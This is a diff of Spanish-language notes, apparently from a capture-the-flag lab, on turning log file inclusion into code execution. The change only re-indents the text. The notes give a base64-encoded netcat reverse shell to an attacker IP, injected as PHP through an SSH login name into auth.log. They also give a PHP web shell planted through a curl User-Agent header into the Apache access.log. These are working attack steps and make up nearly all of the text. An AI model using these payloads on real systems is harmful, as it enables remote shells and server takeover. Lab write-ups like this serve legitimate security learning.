@@ -49,17 +49,20 @@ ahora vamos a explotar el poder leer el archivo auth.log
 
 
 '''
-    para conseguir una ejecucion de comandos necesitamos acceder al archivo /var/log/auth.log
-    una vez tenemos el archivo podemos crear un payload y codificarlo en base 64 :
-    echo "nc -e /bin/bash <ip> 433 | base64; echo
-    este es un ejemplo
-    echo"nc -e /bin/bash 10.10.105.17 433" | base64; echo
-    una vez tenemos el codigo lo copiamos
-    este seria el payload final:
-    echo "bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwNS4xNyA0MzMK" | base64 -d | bash
-    ahora con ssh nos intetamos conectar con el paylodad:
-    ssh <?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwNS4xNyA0MzMK | base64 -d | bash
-    "); ?> @10.10.105.17 
+
+
+
+     para conseguir una ejecucion de comandos necesitamos acceder al archivo /var/log/auth.log
+     una vez tenemos el archivo podemos crear un payload y codificarlo en base 64 :
+     echo "nc -e /bin/bash <ip> 433 | base64; echo
+     este es un ejemplo
+     echo"nc -e /bin/bash 10.10.105.17 433" | base64; echo
+     una vez tenemos el codigo lo copiamos
+     este seria el payload final:
+     echo "bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwNS4xNyA0MzMK" | base64 -d | bash
+     ahora con ssh nos intetamos conectar con el paylodad:
+     ssh <?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwNS4xNyA0MzMK | base64 -d | bash
+     "); ?> @10.10.105.17 
 
 '''
 
@@ -84,10 +87,13 @@ esta seria otra forma
 
 
 '''
-    otra forma de hacerlo seria utilizando (otra vez el access.log , que se encuentra en la ruta /var/log/apache/access.log
-    asi podremos ver los logs y los user agents
-    modificando el user agent podemos injectar codigo tal que asi:
-    curl "http://example.htb -H "User-Agent : <?php system(\$_GET['bash']); ?>"
+
+
+
+     otra forma de hacerlo seria utilizando (otra vez el access.log , que se encuentra en la ruta /var/log/apache/access.log
+     asi podremos ver los logs y los user agents
+     modificando el user agent podemos injectar codigo tal que asi:
+     curl "http://example.htb -H "User-Agent : <?php system(\$_GET['bash']); ?>"
 
 
 '''
